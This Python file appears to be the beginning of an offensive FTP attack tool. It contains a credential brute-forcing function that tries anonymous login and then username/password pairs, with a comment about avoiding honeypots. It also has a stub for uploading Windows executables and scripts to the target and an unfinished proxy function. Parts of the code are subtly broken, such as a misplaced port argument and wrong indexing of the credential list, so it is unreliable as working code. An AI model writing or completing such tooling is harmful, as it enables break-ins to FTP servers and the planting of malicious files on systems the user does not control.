from ftplib import FTP, FTP_TLS
import pefile


def brute(host, port, uplist):
    if host is not None and port is not None and uplist is not None:
        with FTP(str(host), port) as ftpBrute:
            if isinstance(uplist, dict):
                print("Attempting anonymous login first....")
                if "230" in ftpBrute.login():
                    print("Wow, so anonymous login is allowed, double check to make sure this IS NOT a honeypot.")
                for index in uplist:
                    if "230" in ftpBrute.login(user=index[0], passwd=index[1]):
                        print(f"Identified: {index}:{index[1]} as a valid login.")
                    else:
                        continue


def uploader(host, port, username, password, whattoupload, os):
    if isinstance(host, str) and isinstance(port, int) and isinstance(username, str) and isinstance(password, str):
        if isinstance(whattoupload, str) and "win" in str(os).lower():
            print("Ensuring that the upload is PE/PS1/BAT/VBS or other Windows based file types.")



def ftp_proxy(host, port, username, password):
    print("Coming soon.....")


